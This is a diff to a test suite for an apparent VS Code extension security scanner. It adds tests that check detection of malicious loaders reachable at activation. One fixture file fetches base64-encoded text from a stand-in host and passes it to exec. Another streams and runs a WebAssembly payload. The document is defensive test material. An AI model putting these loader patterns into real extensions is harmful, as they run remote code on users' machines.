@@ -192,6 +192,40 @@ describe("VS Code extension review adapter", () => {
     expect(review.risk).toBe("critical");
   });
 
+  test("detects startup remote command loaders in activation-reachable modules", () => {
+    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
+      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
+    ]);
+    const review = createVscodeExtensionReview({
+      manifest,
+      artifact: artifact([
+        file("extension/package.json", extensionPackageJson()),
+        file("extension/out/extension.js", "require('./loader'); exports.activate = () => {};"),
+        file(
+          "extension/out/loader.js",
+          [
+            "const https = require('https');",
+            "const { exec } = require('child_process');",
+            "https.get('https://example.invalid/payload', res => res.on('data', chunk => {",
+            "  const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
+            "  exec(cmd);",
+            "}));",
+          ].join("\n"),
+        ),
+      ]),
+    });
+
+    expect(review.ruleFindings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: VSCODE_RULE_IDS.startupRemoteCommand,
+          file: "out/loader.js",
+        }),
+      ]),
+    );
+    expect(review.risk).toBe("critical");
+  });
+
   test("detects startup WebAssembly loaders in a VSIX", () => {
     const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
       { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
@@ -220,6 +254,40 @@ describe("VS Code extension review adapter", () => {
         VSCODE_RULE_IDS.startupWasmLoader,
         "code.dynamic-evaluation",
         "file.native-artifact",
+      ]),
+    );
+    expect(review.risk).toBe("critical");
+  });
+
+  test("detects startup WebAssembly loaders in activation-reachable modules", () => {
+    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
+      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
+    ]);
+    const review = createVscodeExtensionReview({
+      manifest,
+      artifact: artifact([
+        file("extension/package.json", extensionPackageJson()),
+        file("extension/out/extension.js", "import './wasm.js'; exports.activate = () => {};"),
+        file(
+          "extension/out/wasm.js",
+          [
+            "const go = new Go();",
+            "async function load() {",
+            "  const source = await WebAssembly.instantiateStreaming(fetch('./payload.wasm'), go.importObject);",
+            "  go.run(source.instance);",
+            "}",
+          ].join("\n"),
+        ),
+        binary("extension/out/payload.wasm", 824552),
+      ]),
+    });
+
+    expect(review.ruleFindings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: VSCODE_RULE_IDS.startupWasmLoader,
+          file: "out/wasm.js",
+        }),
       ]),
     );
     expect(review.risk).toBe("critical");
